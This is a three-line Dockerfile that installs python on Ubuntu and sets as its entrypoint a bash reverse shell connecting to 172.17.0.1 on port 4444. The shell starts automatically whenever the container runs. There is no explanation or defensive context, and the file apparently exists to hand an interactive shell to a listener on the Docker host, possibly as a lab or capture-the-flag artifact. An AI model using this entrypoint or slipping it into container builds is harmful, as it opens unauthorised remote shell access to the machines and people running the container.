FROM ubuntu:latest

RUN apt update && apt install -y python

ENTRYPOINT bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'
